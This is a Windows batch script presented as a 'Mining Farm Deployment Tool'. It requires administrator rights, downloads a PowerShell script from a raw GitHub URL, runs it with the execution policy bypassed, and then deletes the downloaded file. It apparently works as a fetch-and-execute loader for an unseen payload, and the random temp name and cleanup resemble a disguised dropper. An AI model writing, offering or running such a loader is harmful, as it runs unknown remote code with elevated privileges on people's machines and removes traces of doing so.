@echo off
title Mining Farm Deployment
color 0A

echo ========================================
echo    Mining Farm Deployment Tool
echo ========================================
echo.

REM Check for Administrator
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERROR] This script must be run as Administrator
    echo Right-click Command Prompt and select Run as Administrator
    pause
    exit /b 1
)

REM URLs
set PS1_URL=https://raw.githubusercontent.com/flanker411/logs/refs/heads/main/g.ps1
set PS1_PATH=%TEMP%\deploy_%RANDOM%.ps1

REM Download the PowerShell script
echo [*] Downloading deployment module...
powershell -Command "& { [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%PS1_URL%' -OutFile '%PS1_PATH%' -UseBasicParsing }" 2>nul

if not exist "%PS1_PATH%" (
    echo [ERROR] Failed to download deployment script
    echo Check your internet connection
    pause
    exit /b 1
)

echo [*] Starting deployment...
echo.

REM Run the PowerShell script
powershell -ExecutionPolicy Bypass -File "%PS1_PATH%"

REM Cleanup
del "%PS1_PATH%" 2>nul

echo.
echo ========================================
echo    Deployment Complete
echo ========================================
echo.
pause